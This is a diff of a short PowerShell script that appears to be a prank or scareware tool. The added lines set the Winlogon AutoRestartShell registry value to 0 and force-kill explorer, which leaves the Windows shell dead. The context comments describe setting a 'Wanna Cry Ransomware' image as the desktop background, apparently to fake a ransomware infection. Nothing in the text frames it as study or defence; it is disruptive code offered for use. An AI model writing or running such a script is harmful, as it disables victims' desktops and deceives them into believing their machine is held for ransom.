@@ -1,13 +1,5 @@
-#Hides Desktop Icons
-$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
-Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
-
-$location = @{Path = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; Name = 'Settings'}
-$value = Get-ItemPropertyValue @location
-$value[8] = if ($value[8] -Eq 122) {123} Else {122}
-Set-ItemProperty @location $value
-
-Get-Process "explorer"| Stop-Process
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoRestartShell -Value 0
+Stop-Process -ProcessName explorer -Force
 
 #Changes Background  
 #URL For the Image of your choice (Wanna Cry Ransomware Background)
